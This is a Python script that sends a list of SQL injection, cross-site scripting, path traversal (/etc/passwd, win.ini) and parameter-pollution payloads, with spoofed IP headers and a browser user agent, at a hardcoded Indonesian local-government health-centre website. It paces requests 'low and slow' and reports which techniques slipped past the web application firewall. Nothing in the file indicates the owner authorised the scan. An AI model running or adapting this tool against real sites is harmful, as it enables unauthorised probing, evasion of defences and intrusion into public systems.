import requests
import sys
import time
import io
import socket
from urllib.parse import quote

# Force UTF-8 for Windows console
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')

TARGET = "https://puskesjaten1.karanganyarkab.go.id"
DELAY = 2  # Low & Slow

def get_checks():
    return [
        # --- SQL Injection ---
        {"cat": "SQLi", "name": "Basic Union", "payload": "/?id=-1 UNION SELECT 1,2,3--"},
        {"cat": "SQLi", "name": "URL Encoded", "payload": "/?id=" + quote("-1 UNION SELECT 1,2,3--")},
        {"cat": "SQLi", "name": "Double URL Encoded", "payload": "/?id=" + quote(quote("-1 UNION SELECT 1,2,3--"))},
        {"cat": "SQLi", "name": "Comment Injection (Space2Comment)", "payload": "/?id=-1/**/UNION/**/SELECT/**/1,2,3--"},
        {"cat": "SQLi", "name": "Case Variation", "payload": "/?id=-1 UnIoN SeLeCt 1,2,3--"},
        {"cat": "SQLi", "name": "Boolean OR", "payload": "/?id=1' OR 1=1#"},
        {"cat": "SQLi", "name": "Boolean OR (Comment)", "payload": "/?id=1'/**/OR/**/1=1#"},

        # --- XSS ---
        {"cat": "XSS", "name": "Script Tag", "payload": "/?q=<script>alert(1)</script>"},
        {"cat": "XSS", "name": "URL Encoded", "payload": "/?q=" + quote("<script>alert(1)</script>")},
        {"cat": "XSS", "name": "Double URL", "payload": "/?q=" + quote(quote("<script>alert(1)</script>"))},
        {"cat": "XSS", "name": "Mixed Case", "payload": "/?q=<ScRiPt>alert(1)</sCrIpT>"},
        {"cat": "XSS", "name": "SVG Payload", "payload": "/?q=<svg/onload=alert(1)>"},

        # --- Path Traversal ---
        {"cat": "LFI", "name": "Etc Passwd", "payload": "/?file=../../../../etc/passwd"},
        {"cat": "LFI", "name": "Win.ini", "payload": "/?file=..\\..\\..\\windows\\win.ini"},
        {"cat": "LFI", "name": "Double Encoded", "payload": "/?file=" + quote(quote("../../../../etc/passwd"))},
        
        # --- Evasion Specials ---
        {"cat": "Evasion", "name": "Parameter Pollution", "payload": "/?id=1&id=-1 UNION SELECT 1,2,3--"},
        {"cat": "Evasion", "name": "Junk Headers", "payload": "/?id=1", "headers": {"X-Originating-IP": "127.0.0.1", "X-Remote-IP": "127.0.0.1"}},
    ]

def test_waf():
    print(f"[+] Starting WAF Evasion Test: {TARGET}")
    print(f"[+] Delay: {DELAY}s (Low & Slow)")
    print("="*60)
    print(f"{'CATEGORY':<10} | {'TECHNIQUE':<25} | {'STATUS':<10} | {'RESULT'}")
    print("-" * 60)

    results = []

    for check in get_checks():
        url = TARGET + check.get("payload", "")
        headers = {
             "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
        }
        if "headers" in check:
            headers.update(check["headers"])

        status = "MSG_ERR"
        code = 0
        try:
            # Check for TCP Reset first (Socket level)
            # Simplified: just use requests, generic connection error usually means Reset/Drop in this specific context 
            # or we can assume requests raises ConnectionError
            
            r = requests.get(url, headers=headers, timeout=10)
            code = r.status_code
            
            if code == 200:
                status = "BYPASSED"
            elif code == 403:
                status = "BLOCKED_L1" # Nginx
            elif code == 406:
                status = "BLOCKED_WAF" # ModSec?
            elif code == 404:
                status = "NOT_FOUND" # Likely bypassed WAF but file missing
            elif code == 500:
                status = "SERVER_ERR" # WAF confused?
            else:
                status = f"CODE_{code}"

        except requests.exceptions.ConnectionError:
            status = "RESET_L2" # Hardware WAF
        except requests.exceptions.Timeout:
            status = "TIMEOUT"
        except Exception as e:
            status = "ERROR"

        # Log Result
        row = f"{check['cat']:<10} | {check['name']:<25} | {status:<10} | Code: {code}"
        print(row)
        results.append({"check": check, "status": status, "code": code})
        
        time.sleep(DELAY)

    print("\n[+] Analysis & Solutions:")
    print("="*60)
    
    # Analyze
    bypassed = [r for r in results if r['status'] in ["BYPASSED", "NOT_FOUND", "SERVER_ERR"]]
    blocked_l1 = [r for r in results if r['status'] == "BLOCKED_L1"]
    blocked_l2 = [r for r in results if r['status'] == "RESET_L2"]

    print(f"Total Tests: {len(results)}")
    print(f"Bypassed   : {len(bypassed)}")
    print(f"Blocked L1 : {len(blocked_l1)} (Nginx)")
    print(f"Blocked L2 : {len(blocked_l2)} (Hardware/IPS)")
    
    print("\n[!] WORKING TECHNIQUES (SOLUTIONS):")
    if bypassed:
        for b in bypassed:
            print(f"   - {b['check']['name']} ({b['check']['cat']}) -> {b['status']}")
    else:
        print("   (None found yet - try combined techniques)")

    print("\n[!] FAILED TECHNIQUES:")
    for b in blocked_l1[:3]:
        print(f"   - {b['check']['name']} -> Caught by Nginx (403)")
    if len(blocked_l1) > 3: print("   ... and more")
    
    for b in blocked_l2[:3]:
        print(f"   - {b['check']['name']} -> Caught by Hardware/IPS (Reset)")
    if len(blocked_l2) > 3: print("   ... and more")

if __name__ == "__main__":
    test_waf()
